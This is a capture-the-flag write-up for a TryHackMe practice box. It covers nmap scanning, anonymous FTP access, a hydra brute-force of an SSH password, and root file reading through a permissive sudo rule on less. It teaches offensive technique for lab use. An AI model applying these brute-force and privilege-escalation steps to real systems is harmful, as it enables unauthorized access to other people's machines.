# Write-Up: Brooklyn Nine Nine

This write-up will walk you through the thought process behind solving the challenge and the decisions made along the way.

## Basic Information

- CTF: [TryHackMe](https://tryhackme.com/room/brooklynninenine)
- Difficulty: Easy

## Description

This room is aimed at beginner level hackers, but anyone can try to hack this box. There are two main intended ways to root the box.

## Approach

### Enumeration

The first thing to do for an easier challenge approach is to add the IP with a meaningful name to the `/etc/hosts` file.

```bash
10.112.157.8 brooklynninenine.thm
```

Then we start an `nmap` scan on this domain with activated standard scripts and version detection for initial enumeration.

```bash
nmap -sC -sV brooklynninenine.thm
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-16 15:39 -0400
Nmap scan report for brooklynninenine.thm (10.112.157.8)
Host is up (0.015s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn`t have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

In the output we see an FTP server, SSH, and a web server running. For the FTP server, we notice that anonymous login is enabled and a file can be accessed. 

### FTP Access

Let's connect to the server and grab the file `note_to_jake.txt`. Just leave the password blank, since we are logging in as anonymous.

```bash
ftp anonymous@10.112.157.8       
Connected to 10.112.157.8.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14554|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> mget note_to_jake.txt
```

The note gives away that Jake's password is weak. This is a hint for us that we can maybe brute-force it.

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

### Initial Access

First, we can try to brute-force Jake's SSH login. For this, we can utilise `hydra` and the `rockyou.txt` password list. This will enumerate the account of Jake with often used passwords and maybe find his used one.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.112.157.8 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organisations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-16 15:56:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.112.157.8:22/
[22][ssh] host: 10.112.157.8   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

And it does! We now have SSH credentials to log in with: `jake`:`987654321`. Let's SSH into Jake's account using his password.

```bash
ssh jake@brooklynninenine.thm
```

On his account, we do not directly find the user flag. But we do find other accounts. Enumerating them, we find the user flag in the account of `holt`.

```bash
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ cd ..
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ ls amy/
jake@brookly_nine_nine:/home$ ls holt/
nano.save  user.txt
jake@brookly_nine_nine:/home$ cat holt/user.txt 
<redacted user flag>
```

### Privilege Escalation

Now, we need to escalate our privileges to root to get the final flag. The first step is to check our current sudo rights.

```bash
jake@brookly_nine_nine:/home$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

The interesting part is the last line. It tells us that we can execute `less` with sudo rights. With a quick look at [GTFOBins](https://gtfobins.org/gtfobins/less/#inherit), we find out that we can read any file with sudo privileges. Trying this on the standard root flag location reveals the flag to us in `less`.

```bash
jake@brookly_nine_nine:/home$ sudo less /root/root.txt

-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <redacted root flag>

Enjoy!!
```

Congratulations on finding the last flag and finishing this room!

## Takeaway

This challenge shows how quickly weak credentials and small hints can lead to full system compromise. Anonymous FTP access exposed a note that pointed directly to a weak password, which could then be exploited via brute forcing against SSH. Finally, overly permissive `sudo` rights allowed privilege escalation. Overall, it reinforces the importance of checking all available services, paying attention to small hints, and always verifying user privileges after initial access.